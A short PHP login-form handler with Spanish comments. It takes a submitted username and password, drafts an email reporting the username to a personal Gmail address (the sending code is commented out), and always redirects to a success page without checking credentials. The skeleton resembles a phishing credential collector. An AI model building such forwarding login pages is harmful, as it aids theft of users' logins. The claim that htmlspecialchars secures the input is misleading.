<?php
// Verifica si se ha enviado el formulario
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Obtiene los datos del formulario de manera segura para evitar inyección de código
    $username = isset($_POST["username"]) ? htmlspecialchars($_POST["username"]) : "";
    $password = isset($_POST["password"]) ? htmlspecialchars($_POST["password"]) : "";

    // Validar que los campos no estén vacíos (puedes agregar más validaciones según tus necesidades)
    if (empty($username) || empty($password)) {
        die("Por favor ingresa tanto el usuario como la contraseña.");
    }

    // Aquí puedes realizar otras acciones, como verificar las credenciales en una base de datos,
    // o simplemente enviar un correo electrónico

    // Envío de correo electrónico de ejemplo (requiere una configuración adecuada del servidor SMTP)
    $to = "danielrosario236.t@gmail.com";
    $subject = "Nuevo intento de inicio de sesión";
    $message = "Se ha intentado iniciar sesión con los siguientes datos:\n\n";
    $message .= "Usuario o Email: $username\n";
    // No incluyas la contraseña en el correo electrónico por motivos de seguridad

    // Envía el correo electrónico usando una librería moderna como PHPMailer (recomendado)
    // Aquí te muestro un ejemplo básico usando PHPMailer:
    // require 'PHPMailer/PHPMailer.php';
    // $mail = new PHPMailer\PHPMailer\PHPMailer();
    // $mail->setFrom('tu_correo@gmail.com', 'Tu Nombre');
    // $mail->addAddress($to);
    // $mail->Subject = $subject;
    // $mail->Body = $message;
    // if (!$mail->send()) {
    //     die('El mensaje no pudo ser enviado.');
    // }

    // Redirecciona al usuario a una página de éxito o error después de procesar el formulario
    header("Location: pagina_de_exito.html"); // Redirige a una página de éxito
    exit();
}
?>
